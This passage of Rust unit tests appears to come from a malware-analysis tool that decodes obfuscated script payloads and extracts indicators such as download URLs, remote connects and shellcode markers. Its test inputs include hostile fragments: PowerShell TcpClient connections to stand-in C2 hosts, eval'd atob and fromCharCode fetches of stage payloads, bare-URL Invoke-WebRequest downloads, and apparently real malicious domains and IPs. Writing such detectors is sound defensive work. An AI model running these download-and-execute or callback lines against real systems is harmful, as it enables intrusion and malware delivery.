                t,
                Trait::SelfExtract { method } if method == "extrac32-self-cab"
            )
        });
        assert!(has_self_extract, "no SelfExtract trait: {:?}", ts);
    }

    #[test]
    fn extrac32_with_explicit_src_is_not_self_reference() {
        let line = r#"extrac32 /y "C:\Windows\System32\msi.cab" "C:\Users\Public\out.msi""#;
        let ts = traits_of(line);
        let extrac = ts.iter().find_map(|t| match t {
            Trait::Extrac32 {
                src,
                dst,
                self_reference,
            } => Some((src.clone(), dst.clone(), *self_reference)),
            _ => None,
        });
        assert_eq!(
            extrac,
            Some((
                "C:\\Windows\\System32\\msi.cab".to_string(),
                "C:\\Users\\Public\\out.msi".to_string(),
                false,
            ))
        );
    }

    #[test]
    fn extrac32_handler_dedup_with_scanner() {
        // Both interp's h_extrac32 and our scanner would emit Extrac32
        // for the same line — verify we don't double-emit.
        let line = r#"extrac32 /y "%~f0" "%tmp%\x.exe""#;
        let mut env = Environment::new(&Config::default());
        env.traits.push(Trait::Extrac32 {
            src: "%~f0".into(),
            dst: "%tmp%\\x.exe".into(),
            self_reference: true,
        });
        scan_extrac32_self_extract(line, &mut env);
        let extrac_count = env
            .traits
            .iter()
            .filter(|t| matches!(t, Trait::Extrac32 { .. }))
            .count();
        assert_eq!(extrac_count, 1, "double-emit: {:?}", env.traits);
    }
}

#[cfg(test)]
#[allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
mod js_unescape_url_tests {
    use super::scan_js_unescape_urls;
    use crate::env::Environment;
    use crate::traits::Trait;
    use crate::Config;

    fn urls(script: &str) -> Vec<String> {
        let mut env = Environment::new(&Config::default());
        scan_js_unescape_urls(script, &mut env);
        env.traits
            .into_iter()
            .filter_map(|t| match t {
                Trait::DownloadInDeobText { src, .. } => Some(src),
                _ => None,
            })
            .collect()
    }

    fn pct(s: &str) -> String {
        use std::fmt::Write;

        let mut out = String::with_capacity(s.len() * 3);
        for b in s.bytes() {
            write!(&mut out, "%{b:02X}").expect("write to String");
        }
        out
    }

    #[test]
    fn unescape_url_encoded_blob_decodes_url() {
        // 7e2d7cede80f… JS corpus shape: `unescape('%XX%XX…')` decodes
        // to a JS body whose `targets = [...]` array hosts C2 URLs.
        let inner = "const targets = ['https://gov-cn.cloud/01Gni', 'https://gov-cn.cloud/NKB39'];";
        let script = format!("var s = unescape('{}');", pct(inner));
        let extracted = urls(&script);
        assert!(extracted.iter().any(|u| u == "https://gov-cn.cloud/01Gni"));
        assert!(extracted.iter().any(|u| u == "https://gov-cn.cloud/NKB39"));
    }

    #[test]
    fn decode_uricomponent_works_too() {
        let inner = "fetch('https://attacker-domain.example.io/beacon');";
        let script = format!("eval(decodeURIComponent('{}'));", pct(inner));
        assert!(urls(&script)
            .iter()
            .any(|u| u == "https://attacker-domain.example.io/beacon"));
    }

    #[test]
    fn u_escape_form_handled() {
        // `%uXXXX` (UTF-16 codepoint) form — used by some older JS
        // obfuscators. ASCII codepoints encode the same as `%XX`.
        let s = "var u = unescape('%u0068%u0074%u0074%u0070%u003a%u002f%u002fwww.evil-domain-test.cc/x');";
        let extracted = urls(s);
        assert!(
            extracted
                .iter()
                .any(|u| u.contains("evil-domain-test.cc/x")),
            "got {:?}",
            extracted
        );
    }

    #[test]
    fn no_url_in_decoded_text_does_not_misfire() {
        let s = format!(
            "var s = unescape('{}');",
            pct("just some random text no URL here")
        );
        assert!(urls(&s).is_empty());
    }

    #[test]
    fn long_non_ascii_unescape_blob_does_not_panic_at_scan_cap() {
        let encoded = format!("A{}", "%u00e9".repeat(8192));
        let script = format!("var s = unescape('{encoded}');");
        assert!(urls(&script).is_empty());
    }
}

#[cfg(test)]
#[allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
mod js_fromcharcode_url_tests {
    use super::scan_js_fromcharcode_urls;
    use crate::env::Environment;
    use crate::traits::Trait;
    use crate::Config;

    fn urls(script: &str) -> Vec<String> {
        let mut env = Environment::new(&Config::default());
        scan_js_fromcharcode_urls(script, &mut env);
        env.traits
            .into_iter()
            .filter_map(|t| match t {
                Trait::DownloadInDeobText { src, .. } => Some(src),
                _ => None,
            })
            .collect()
    }

    fn fcc(s: &str) -> String {
        use std::fmt::Write;

        let mut out = String::with_capacity(s.len() * 4);
        for (idx, b) in s.bytes().enumerate() {
            if idx > 0 {
                out.push(',');
            }
            write!(&mut out, "{b}").expect("write to String");
        }
        out
    }

    #[test]
    fn single_fromcharcode_decodes_url() {
        // eszja_1.3.41.js corpus shape — `String.fromCharCode(104,116,116,…)`.
        let url = "https://nav.domains/fall_back";
        let script = format!("var u = String.fromCharCode({});", fcc(url));
        let extracted = urls(&script);
        assert_eq!(extracted, vec![url.to_string()]);
    }

    #[test]
    fn bracket_property_fromcharcode_decodes_url() {
        let url = "https://nav-bracket.example/fall_back";
        let script = format!(r#"var u = String["fromCharCode"]({});"#, fcc(url));
        let extracted = urls(&script);
        assert_eq!(extracted, vec![url.to_string()]);
    }

    #[test]
    fn hex_fromcharcode_decodes_url() {
        let url = "https://nav-hex.example/fall_back";
        let chars = url
            .bytes()
            .map(|b| format!("0x{b:02x}"))
            .collect::<Vec<_>>()
            .join(",");
        let script = format!("var u = String.fromCharCode({chars});");
        let extracted = urls(&script);
        assert_eq!(extracted, vec![url.to_string()]);
    }

    #[test]
    fn concatenated_fromcharcode_chains_decode_as_one_string() {
        // `String.fromCharCode(…) + String.fromCharCode(…)` style splits
        // the URL across two calls — common JS-packer evasion.
        let a = "https://attacker-c2.example-evil-domain.io/";
        let b = "panel/login.php";
        let script = format!(
            "var u = String.fromCharCode({}) + String.fromCharCode({});",
            fcc(a),
            fcc(b)
        );
        let extracted = urls(&script);
        assert!(
            extracted.iter().any(|u| u.contains("panel/login.php")),
            "expected concatenated URL; got {:?}",
            extracted
        );
    }

    #[test]
    fn fromcharcode_without_url_does_not_misfire() {
        // Plain text "Hello, World!" — no URL, no trait.
        let script = format!("var s = String.fromCharCode({});", fcc("Hello, World!"));
        assert!(urls(&script).is_empty());
    }

    #[test]
    fn malformed_numbers_skipped_silently() {
        // Non-digit garbage between commas — should not crash.
        let script = r#"var x = String.fromCharCode(72, abc, 105);"#;
        let _ = urls(script); // smoke test
    }
}

#[cfg(test)]
#[allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
mod js_atob_deob_text_tests {
    use super::scan_deob_text;
    use crate::env::Environment;
    use crate::traits::Trait;
    use crate::Config;
    use base64::Engine;

    #[test]
    fn raw_deob_text_atob_payload_urls_surface() {
        let decoded = "fetch('https://raw-atob.example/stage.js')";
        let encoded = base64::engine::general_purpose::STANDARD.encode(decoded.as_bytes());
        let mut env = Environment::new(&Config::default());

        scan_deob_text(&format!("eval(atob('{encoded}'));"), &mut env);

        assert!(
            env.traits.iter().any(|t| matches!(
                t,
                Trait::DownloadInDeobText { src, line_hint }
                    if src == "https://raw-atob.example/stage.js"
                        && line_hint == "js-atob"
            )),
            "raw atob URL was not surfaced: {:?}",
            env.traits
        );
    }
}

#[cfg(test)]
#[allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
mod rot13_url_tests {
    use super::scan_deob_text;
    use crate::env::Environment;
    use crate::traits::Trait;
    use crate::Config;

    #[test]
    fn rot13_url_in_deob_text_is_extracted() {
        let mut env = Environment::new(&Config::default());

        scan_deob_text(
            r#"powershell -ExecutionPolicy Bypass -Command "[Fiber.Program]::Main('uggcf://rknzcyr.pbz/cnlybnq.cat')""#,
            &mut env,
        );

        assert!(
            env.traits.iter().any(|t| {
                matches!(t,
                    Trait::DownloadInDeobText { src, .. }
                        if src == "https://example.com/payload.png")
            }),
            "ROT13 URL was not extracted from deob text: {:?}",
            env.traits
        );
    }
}

#[cfg(test)]
#[allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
mod ps_tcp_client_tests {
    use super::scan_remote_connects;
    use crate::env::Environment;
    use crate::traits::Trait;
    use crate::Config;

    fn connects(script: &str) -> Vec<(String, u16)> {
        let mut env = Environment::new(&Config::default());
        scan_remote_connects(script, &mut env);
        env.traits
            .into_iter()
            .filter_map(|t| match t {
                Trait::RemoteConnect { host, port, .. } => Some((host, port)),
                _ => None,
            })
            .collect()
    }

    #[test]
    fn ps_tcp_client_ip_port_paren_form() {
        // st.ps1 corpus shape — `New-Object Net.Sockets.TcpClient("ip", port)`.
        let s = r#"$c = New-Object Net.Sockets.TcpClient("45.82.69.203", 443);"#;
        assert_eq!(connects(s), vec![("45.82.69.203".to_string(), 443)]);
    }

    #[test]
    fn ps_tcp_client_system_prefix_works() {
        // `New-Object System.Net.Sockets.TcpClient(...)` form.
        let s = r#"New-Object System.Net.Sockets.TcpClient("c2.evil.com", 8080)"#;
        assert_eq!(connects(s), vec![("c2.evil.com".to_string(), 8080)]);
    }

    #[test]
    fn ps_tcp_client_argumentlist_flag_form() {
        let s = r#"New-Object Net.Sockets.TcpClient -ArgumentList '10.0.0.5', 4444"#;
        assert_eq!(connects(s), vec![("10.0.0.5".to_string(), 4444)]);
    }

    #[test]
    fn ps_tcp_client_with_variable_args_does_not_fire() {
        // 13 corpus samples use `$ip, $port` — no literal host/port to
        // capture. We don't emit RemoteConnect for those (no signal to
        // give without runtime values).
        let s = r#"New-Object System.Net.Sockets.TcpClient($ip, $port)"#;
        assert!(connects(s).is_empty());
    }
}

#[cfg(test)]
#[allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
mod ps_char_index_extractor_tests {
    use super::scan_ps_char_index_extractor_urls;
    use crate::env::Environment;
    use crate::traits::Trait;
    use crate::Config;

    fn urls(script: &str) -> Vec<String> {
        let mut env = Environment::new(&Config::default());
        scan_ps_char_index_extractor_urls(script, &mut env);
        env.traits
            .into_iter()
            .filter_map(|t| match t {
                Trait::DownloadInDeobText { src, .. } => Some(src),
                _ => None,
            })
            .collect()
    }

    fn traits(script: &str) -> Vec<Trait> {
        let mut env = Environment::new(&Config::default());
        scan_ps_char_index_extractor_urls(script, &mut env);
        env.traits
    }

    fn pad_extracted(decoded: &str) -> String {
        decoded.chars().flat_map(|ch| ['x', ch]).collect::<String>()
    }

    #[test]
    fn musculos_style_extractor_unlocks_url() {
        // 订单列表.bat family — function takes a noise-padded string and
        // extracts chars at indices 3, 7, 11, … (start=3, step=4).
        let script = r#"
            function Musculos ($filmprod){
                $overill=3;
                do { $sirp+=$filmprod[$overill]; $overill+=4; }
                until (!$filmprod[$overill])
                $sirp
            }
            $u = Musculos 'a.ahaaataaataaapaaasaaa:aaa/ aa/aa saaahaaaaaaal a oaa u a.x aataaa.aaata ao.aapaaa/aaaBaaaoaaataa taaa1aaa7aaa4aaa.aaam aad a p'
        "#;
        let extracted = urls(script);
        assert!(
            extracted
                .iter()
                .any(|u| u == "https://shalouxt.top/Bott174.mdp"),
            "expected shalouxt.top URL; got {:?}",
            extracted
        );
    }

    #[test]
    fn extractor_download_context_promotes_url_to_download() {
        let url = "https://ps-char-context.example/stage.bin";
        let download_call = "$wc.DownloadFile($url,$dst)";
        let script = format!(
            r#"
            function Pick ($p){{
                $i=1;
                do {{ $r+=$p[$i]; $i+=2; $noise=Compare-Object alpha beta; }}
                until (!$p[$i])
                $r
            }}
            $url = Pick '{}'
            Pick '{}'
        "#,
            pad_extracted(url),
            pad_extracted(download_call)
        );

        let traits = traits(&script);
        assert!(
            traits.iter().any(|t| matches!(
                t,
                Trait::Download { src, .. } if src == url
            )),
            "expected structured Download from decoded download context; got {:?}",
            traits
        );
        assert!(
            !traits.iter().any(|t| matches!(
                t,
                Trait::DownloadInDeobText { src, .. } if src == url
            )),
            "decoded download context should not leave a generic URL trait: {:?}",
            traits
        );
    }

    #[test]
    fn extracted_url_stops_at_ascii_punctuation_without_trailing_junk() {
        let mut env = Environment::new(&Config::default());
        let mut seen = std::collections::HashSet::new();
        let known = std::collections::HashSet::new();
        super::try_extract_url_from_buf(
            "héhttp://example.com/payload.ps1)",
            &known,
            &mut seen,
            &mut env,
        );
        assert!(env.traits.iter().any(|t| matches!(
            t,
            Trait::DownloadInDeobText { src, .. } if src == "http://example.com/payload.ps1"
        )));
    }

    #[test]
    fn extractor_with_start_2_step_3() {
        // Variant with different start/step — make sure we don't hardcode.
        // String: `aaXbbYccZddH`, start=2, step=3 → X, Y, Z, H = "XYZH"
        // (not a URL, so just verify the scanner runs without crashing).
        let script = r#"
            function Foo ($p){
                $i=2; do { $r+=$p[$i]; $i+=3 } until (!$p[$i]) $r
            }
            $x = Foo 'aaXbbYccZddH'
        "#;
        let _ = urls(script); // no URL expected; just smoke-test
    }

    #[test]
    fn function_without_index_indirection_does_not_misfire() {
        // A function that just iterates without indexing should NOT
        // register as an extractor.
        let script = r#"
            function Sum ($n){ $i=0; do { $s+=1; $i+=1 } until ($i -ge $n) $s }
            $x = Sum 5
        "#;
        assert!(urls(script).is_empty());
    }
}

#[cfg(test)]
#[allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
mod ps_bare_url_download_tests {
    use super::scan_ps_bare_url_downloads;
    use crate::env::Environment;
    use crate::traits::Trait;
    use crate::Config;

    fn urls(script: &str) -> Vec<String> {
        let mut env = Environment::new(&Config::default());
        scan_ps_bare_url_downloads(script, &mut env);
        env.traits
            .into_iter()
            .filter_map(|t| match t {
                Trait::DownloadInDeobText { src, .. } => Some(src),
                _ => None,
            })
            .collect()
    }

    #[test]
    fn iwr_uri_bare_host_synthesizes_http_prefix() {
        // document.vbs / test1.vbs corpus shape.
        let s = r#"iwr -Uri 'rebrand.ly/47i82k6' -OutFile $env:TEMP\f.exe"#;
        assert_eq!(urls(s), vec!["http://rebrand.ly/47i82k6".to_string()]);
    }

    #[test]
    fn start_process_bare_host_synthesizes_http_prefix() {
        // MICROSOFT_OFFICE_EXCEL_A.vbs corpus shape.
        let s = r#"Start-Process 'goingupdate.com/ptoleqco'"#;
        assert_eq!(urls(s), vec!["http://goingupdate.com/ptoleqco".to_string()]);
    }

    #[test]
    fn invoke_restmethod_bare_host_works_too() {
        let s = r#"Invoke-RestMethod 'evil-c2.io/beacon'"#;
        assert_eq!(urls(s), vec!["http://evil-c2.io/beacon".to_string()]);
    }

    #[test]
    fn comobject_wscript_shell_does_not_misfire() {
        // The whole point of the TLD allowlist — `Wscript.Shell`,
        // `Script.Shell`, `Net.WebClient` etc. must NOT be treated as
        // bare URLs even though they have a dot.
        let s = r#"$s = New-Object -ComObject 'Wscript.Shell'"#;
        assert!(urls(s).is_empty(), "false positive on Wscript.Shell");
        let s2 = r#"Start-Process Script.Shell"#;
        assert!(urls(s2).is_empty(), "false positive on Script.Shell");
    }

    #[test]
    fn no_quotes_around_host_does_not_misfire() {
        // The regex requires quotes — `start microsoft.com` could be a
        // bare arg list but is too risky without quotes.
        let s = r#"Start-Process microsoft.com"#;
        assert!(urls(s).is_empty(), "should require quotes");
    }
}

#[cfg(test)]
#[allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
mod inline_b64_url_extraction_tests {
    use super::{scan_b64_url_prefix, scan_bare_b64_urls, scan_inline_b64_urls};
    use crate::env::Environment;
    use crate::traits::Trait;
    use crate::Config;
    use base64::Engine;

    fn urls(script: &str) -> Vec<String> {
        let mut env = Environment::new(&Config::default());
        scan_inline_b64_urls(script, &mut env);
        env.traits
            .into_iter()
            .filter_map(|t| match t {
                Trait::DownloadInDeobText { src, .. } => Some(src),
                _ => None,
            })
            .collect()
    }

    #[test]
    fn b64_decoded_ps_body_urls_surface() {
        // Data.ps1 family: the whole script is a single
        // `[Convert]::FromBase64String('<b64>')` that decodes to a PS body
        // containing several URLs. We should surface each URL even though
        // the decoded text does NOT start with `http://`.
        let body = r#"$Urls = @{ "a" = "https://github.com/lee-willie/Data/raw/refs/heads/main/Start.vbs" }"#;
        let b64 = base64::engine::general_purpose::STANDARD.encode(body);
        let script = format!("$e = [System.Convert]::FromBase64String('{b64}')");
        let extracted = urls(&script);
        assert!(
            extracted
                .iter()
                .any(|u| u.contains("github.com/lee-willie/Data/raw/refs/heads/main/Start.vbs")),
            "expected github URL, got {:?}",
            extracted
        );
    }

    #[test]
    fn b64_decoded_bare_url_still_surfaces() {
        // Bare-URL fast path — preserves prior behaviour.
        let b64 = base64::engine::general_purpose::STANDARD
            .encode("https://attacker-example.org/payload.exe");
        let script = format!("[Convert]::FromBase64String('{b64}')");
        let extracted = urls(&script);
        assert_eq!(
            extracted,
            vec!["https://attacker-example.org/payload.exe".to_string()]
        );
    }

    #[test]
    fn b64_url_prefix_extracts_file_url() {
        let url = "file:///C:/Windows/System32/calc.exe";
        let b64 = base64::engine::general_purpose::STANDARD.encode(url.as_bytes());
        let deob = format!("set encoded_url={b64}\r\n");
        let mut env = Environment::new(&Config::default());
        scan_b64_url_prefix(&deob, &mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, cmd, .. } if src == url && cmd == "b64-url-prefix"
            )
        });
        assert!(has, "standalone file b64 URL missed: {:?}", env.traits);
    }

    #[test]
    fn b64_decoded_bare_url_with_control_byte_is_rejected() {
        let b64 = base64::engine::general_purpose::STANDARD
            .encode(b"https://attacker-example.org/pa\x07yload.exe");
        let script = format!("[Convert]::FromBase64String('{b64}')");
        assert!(urls(&script).is_empty());
    }

    #[test]
    fn b64_decoded_garbage_does_not_misfire() {
        // Random bytes shouldn't yield a URL.
        let b64 = base64::engine::general_purpose::STANDARD.encode([0u8; 32]);
        let script = format!("[Convert]::FromBase64String('{b64}')");
        assert!(urls(&script).is_empty());
    }

    #[test]
    fn inline_b64_duplicate_literals_decode_once() {
        let url = "https://inline.example/payload.exe";
        let b64 = base64::engine::general_purpose::STANDARD.encode(url.as_bytes());
        let script =
            format!("[Convert]::FromBase64String('{b64}') + [Convert]::FromBase64String('{b64}')");
        let extracted = urls(&script);
        assert_eq!(extracted, vec![url.to_string()]);
    }

    #[test]
    fn quoted_b64_duplicate_literals_decode_once() {
        let url = "https://quoted.example/payload.exe?token=abcdefghijklmnopqrstuvwxyz0123456789";
        let b64 = base64::engine::general_purpose::STANDARD.encode(url.as_bytes());
        let script = format!("'{b64}' + '{b64}'");
        let mut env = Environment::new(&Config::default());
        scan_bare_b64_urls(&script, &mut env);
        let urls: Vec<_> = env
            .traits
            .iter()
            .filter_map(|t| match t {
                crate::traits::Trait::DownloadInDeobText { src, .. } => Some(src.clone()),
                _ => None,
            })
            .collect();
        assert_eq!(urls, vec![url.to_string()]);
    }
}

#[cfg(test)]
#[allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
mod shellcode_marker_tests {
    use super::scan_shellcode_marker;
    use crate::env::Environment;
    use crate::traits::Trait;
    use crate::Config;

    fn evidences(script: &str) -> Vec<String> {
        let mut env = Environment::new(&Config::default());
        scan_shellcode_marker(script, &mut env);
        env.traits
            .into_iter()
            .filter_map(|t| match t {
                Trait::ShellcodeMarker { evidence } => Some(evidence),
                _ => None,
            })
            .collect()
    }

    #[test]
    fn msf_x64_prologue_detected() {
        // meter.ps1 family: classic `cld; sub rsp, 0xf0` x64 prologue.
        let s = r#"[Byte[]] $BqFIleukW = 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x0"#;
        assert!(evidences(s).contains(&"msf-x64-prologue".to_string()));
    }

    #[test]
    fn msf_x86_prologue_detected() {
        // 32-bit Metasploit `cld; call <next>` GetEIP prologue.
        let s = r#"[Byte[]] $sc = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89"#;
        assert!(evidences(s).contains(&"msf-x86-prologue".to_string()));
    }

    #[test]
    fn lone_0xfc_e8_outside_byte_array_does_not_misfire() {
        // The bytes `0xfc, 0xe8` could appear in any other byte array
        // (e.g. AES round-key blob). Require the `[Byte[]] $x = …` wrap.
        let s = r#"$key = 0xfc, 0xe8, 0x10, 0x20"#;
        assert!(!evidences(s).iter().any(|e| e.starts_with("msf-")));
    }
}

#[cfg(test)]
#[allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
mod url_obfuscation_collapse_tests {
    use super::normalize_url_obfuscation;

    #[test]
    fn empty_quote_pair_splice_collapses() {
        // NEW-DRAWING-SHEET.bat: `start "" "https://raw.githubuserc""o""ntent.c""o""m/.../DOC.zip"`
        assert_eq!(
            normalize_url_obfuscation(
                "https://raw.githubuserc\"\"o\"\"ntent.c\"\"o\"\"m/knkbkk212/main/DOC.zip"
            ),
            "https://raw.githubusercontent.com/knkbkk212/main/DOC.zip"
        );
    }

    #[test]
    fn url_without_quote_obfuscation_is_unchanged() {
        // Common case fast-path: don't allocate when there's nothing to do.
        let url = "https://example.com/path?q=1";
        assert_eq!(normalize_url_obfuscation(url), url);
    }
}

#[cfg(test)]
#[allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
mod webdav_url_tests {
    use super::unc_webdav_to_http_url;

    #[test]
    fn ip_port_davwwwroot_to_http() {
        let url = unc_webdav_to_http_url(
            "45.9.74.36",
            "8888",
            "\\\\45.9.74.36@8888\\davwwwroot\\28618396929411.dll",
        );
        assert_eq!(url, "http://45.9.74.36:8888/28618396929411.dll");
    }

    #[test]
    fn ssl_no_port_to_https() {
        let url = unc_webdav_to_http_url(
            "stays-recipes.trycloudflare.com",
            "SSL",
            "\\\\stays-recipes.trycloudflare.com@SSL\\DavWWWRoot",
        );
        assert_eq!(url, "https://stays-recipes.trycloudflare.com");
    }

    #[test]
    fn ssl_with_trailing_file_to_https() {
        let url = unc_webdav_to_http_url(
            "host.example.com",
            "SSL",
            "\\\\host.example.com@SSL\\DavWWWRoot\\loader.bat",
        );
        assert_eq!(url, "https://host.example.com/loader.bat");
    }

    #[test]
    fn non_davwwwroot_share_kept_as_path_segment() {
        let url = unc_webdav_to_http_url("10.0.0.5", "8080", "\\\\10.0.0.5@8080\\public\\file.exe");
        assert_eq!(url, "http://10.0.0.5:8080/public/file.exe");
    }

    #[test]
    fn default_ports_dropped_from_url() {
        assert_eq!(
            unc_webdav_to_http_url("h", "80", "\\\\h@80\\davwwwroot"),
            "http://h"
        );
        assert_eq!(
            unc_webdav_to_http_url("h", "443", "\\\\h@443\\davwwwroot"),
            "http://h"
        );
    }

    #[test]
    fn nested_path_preserved() {
        let url = unc_webdav_to_http_url("h", "8888", "\\\\h@8888\\davwwwroot\\a\\b\\c.dll");
        assert_eq!(url, "http://h:8888/a/b/c.dll");
    }
}

#[cfg(test)]
#[allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
mod decimal_ip_url_tests {
    use super::*;
    use crate::env::Environment;
    use crate::Config;

    fn run_and_collect_urls(deob: &str) -> Vec<String> {
        let mut env = Environment::new(&Config::default());
        scan_decimal_ip_urls(deob, &mut env);
        env.traits
            .iter()
            .filter_map(|t| match t {
                Trait::Download { src, .. } => Some(src.clone()),
                Trait::DownloadInDeobText { src, .. } => Some(src.clone()),
                _ => None,
            })
            .collect()
    }

    fn run_and_collect_traits(deob: &str) -> Vec<Trait> {
        let mut env = Environment::new(&Config::default());
        scan_decimal_ip_urls(deob, &mut env);
        env.traits
    }

    #[test]
    fn ps_invoke_webrequest_decimal_ip_decodes_to_dotted_quad() {
        // 1297338337 = 0x4D53CFE1 = 77.83.207.225
        let urls = run_and_collect_urls("Invoke-WebRequest 1297338337/x.jpg");
        assert_eq!(urls, vec!["http://77.83.207.225/x.jpg".to_string()]);
    }

    #[test]
    fn ps_invoke_webrequest_decimal_ip_emits_structured_download() {
        let traits = run_and_collect_traits("Invoke-WebRequest 1297338337/x.jpg");
        assert!(
            traits.iter().any(|t| matches!(
                t,
                Trait::Download { src, .. } if src == "http://77.83.207.225/x.jpg"
            )),
            "decimal-IP Invoke-WebRequest should emit Download: {:?}",
            traits
        );
        assert!(
            !traits.iter().any(|t| matches!(
                t,
                Trait::DownloadInDeobText { src, .. } if src == "http://77.83.207.225/x.jpg"
            )),
            "decimal-IP Invoke-WebRequest should not stay generic: {:?}",
            traits
        );
    }

    #[test]
    fn iwr_decimal_ip_without_path_still_emits() {
        let urls = run_and_collect_urls("iwr 16777216");
        assert_eq!(urls, vec!["http://1.0.0.0".to_string()]);
    }

    #[test]
    fn decimal_ip_with_invalid_high_octet_zero_is_skipped() {
        // 1234567 = 0x12d687, high byte = 0 → reject (not a valid IPv4 host)
        let urls = run_and_collect_urls("Invoke-WebRequest 1234567/p");
        assert!(urls.is_empty(), "got: {:?}", urls);
    }

    #[test]
    fn quoted_decimal_ip_form_is_recognized() {
        let urls = run_and_collect_urls(r#"DownloadString("1297338337/payload")"#);
        assert_eq!(urls, vec!["http://77.83.207.225/payload".to_string()]);
    }

    #[test]
    fn truncation_of_11plus_digit_runs_is_rejected() {
        // Regression: `\d{8,10}` greedily consumed the first 10 digits of
        // an 11-digit number, parsed as u32, emitted a fabricated IP URL.
        let urls = run_and_collect_urls(r#"Invoke-WebRequest 12345678901"#);
        assert!(
            urls.is_empty(),
            "11-digit run must not yield a phantom IOC; got: {:?}",
            urls
        );
    }

    #[test]
    fn prose_curl_in_comment_does_not_emit_phantom_ioc() {
        // Regression: `\bcurl\b` matched `curl` inside a prose comment,
        // captured the adjacent integer (timestamp/ID), and emitted a
        // fabricated Download trait. Verb anchor now requires command
        // position (line start or separator), not just word boundary.
        let urls = run_and_collect_urls("the analyst noted curl request id 1297338337-abcde");
        assert!(
            urls.is_empty(),
            "comment-prose mention must not emit IOC; got: {:?}",
            urls
        );
    }

    #[test]
    fn path_stops_at_semicolon_for_multi_statement_lines() {
        // Regression: path char class included `;` so the next PS statement
        // was swallowed into the URL.
        let urls = run_and_collect_urls("iwr 1297338337/x.jpg;Stop-Process");
        assert_eq!(urls, vec!["http://77.83.207.225/x.jpg".to_string()]);
    }

    #[test]
    fn line_start_invocation_still_extracts() {
        // Sanity: a normal command-line position match should still fire.
        let urls = run_and_collect_urls("Invoke-WebRequest 1297338337/x.jpg");
        assert_eq!(urls, vec!["http://77.83.207.225/x.jpg".to_string()]);
    }
}

#[cfg(test)]
#[allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
mod curl_redirect_parser_tests {
    use super::{
        normalize_curl_text, parse_curl_like_download, parse_curl_output_dst,
        parse_glued_curl_download, split_words,
    };

    #[test]
    fn echoed_full_path_curl_output_path_survives_normalization() {
        let raw = r#"curl.exe" https://fullpath-curl.example/z.rar -o c:\users\public\z.rar "#;
        let normalized = normalize_curl_text(raw);
        let tokens = split_words(&normalized);
        assert_eq!(tokens[0], "curl.exe");
        assert!(
            tokens.iter().any(|t| t == "-o"),
            "missing -o token: {:?}",
            tokens
        );
        assert!(
            tokens
                .iter()
                .any(|t| t.eq_ignore_ascii_case("c:\\users\\public\\z.rar")),
            "missing output token: {:?}",
            tokens
        );
        assert_eq!(
            parse_curl_output_dst(&normalized).as_deref(),
            Some(r#"c:\users\public\z.rar"#)
        );
    }

    #[test]
    fn parse_curl_like_download_accepts_mixed_case_short_output_tokens() {
        let tokens = split_words(
            r#"CuRl -k "https://curl-short.example/payload.bin" --OuTpUt "C:\Temp\payload.bin""#,
        );
        assert_eq!(
            parse_curl_like_download(&tokens),
            Some((
                "https://curl-short.example/payload.bin".to_string(),
                Some("C:\\Temp\\payload.bin".to_string())
            ))
        );
    }

    #[test]
    fn parse_curl_like_download_accepts_url_equals_option() {
        let tokens =
            split_words(r#"curl --url=https://curl-url-equals.example/payload.bin -o out.bin"#);
        assert_eq!(
            parse_curl_like_download(&tokens),
            Some((
                "https://curl-url-equals.example/payload.bin".to_string(),
                Some("out.bin".to_string())
            ))
        );
    }

    #[test]
    fn parse_curl_like_download_accepts_long_remote_name() {
        let tokens = split_words(r#"curl --remote-name https://curl-remote.example/payload.bin"#);
        assert_eq!(
            parse_curl_like_download(&tokens),
            Some((
                "https://curl-remote.example/payload.bin".to_string(),
                Some("payload.bin".to_string())
            ))
        );
    }

    #[test]
    fn parse_curl_like_download_accepts_compact_remote_name() {
        let tokens = split_words(r#"curl -LO https://curl-compact-remote.example/payload.bin"#);
        assert_eq!(
            parse_curl_like_download(&tokens),
            Some((
                "https://curl-compact-remote.example/payload.bin".to_string(),
                Some("payload.bin".to_string())
            ))
        );
    }

    #[test]
    fn parse_curl_like_download_accepts_compact_short_output_flags() {
        let tokens =
            split_words(r#"curl -kLoC:\Temp\compact.bin https://curl-compact.example/payload.bin"#);
        assert_eq!(
            parse_curl_like_download(&tokens),
            Some((
                "https://curl-compact.example/payload.bin".to_string(),
                Some("C:\\Temp\\compact.bin".to_string())
            ))
        );
    }

    #[test]
    fn parse_curl_like_download_accepts_compact_short_output_next_token() {
        let tokens = split_words(
            r#"curl -ko C:\Temp\next.bin https://curl-compact-next.example/payload.bin"#,
        );
        assert_eq!(
            parse_curl_like_download(&tokens),
            Some((
                "https://curl-compact-next.example/payload.bin".to_string(),
                Some("C:\\Temp\\next.bin".to_string())
            ))
        );
    }

    #[test]
    fn glued_curl_does_not_split_short_output_inside_url() {
        assert_eq!(
            parse_glued_curl_download(
                r#"curl.exe "https://curl-long-output.example/drop.exe" --output out.exe"#
            ),
            Some((
                "https://curl-long-output.example/drop.exe".to_string(),
                None
            ))
        );
    }

    #[test]
    fn glued_curl_does_not_split_long_output_inside_hostname() {
        assert_eq!(
            parse_glued_curl_download(
                r#"curl.exe "https://curl--output.example/drop.exe" --output out.exe"#
            ),
            Some(("https://curl--output.example/drop.exe".to_string(), None))
        );
    }
}

#[cfg(test)]
#[allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
mod liberal_url_scheme_tests {
    use super::{
        contains_liberal_url_scheme, decoded_python_b64decode_literals, is_noise_url_context,
        normalize_liberal_url_token, scan_python_requests_get_deob_text,
    };
    use crate::env::{Config, Environment};
    use crate::traits::Trait;

    #[test]
    fn mixed_case_url_schemes_are_detected() {
        assert!(contains_liberal_url_scheme("FiLe:///C:/Temp/payload.exe"));
        assert!(contains_liberal_url_scheme("HtTpS://evil.example/payload"));
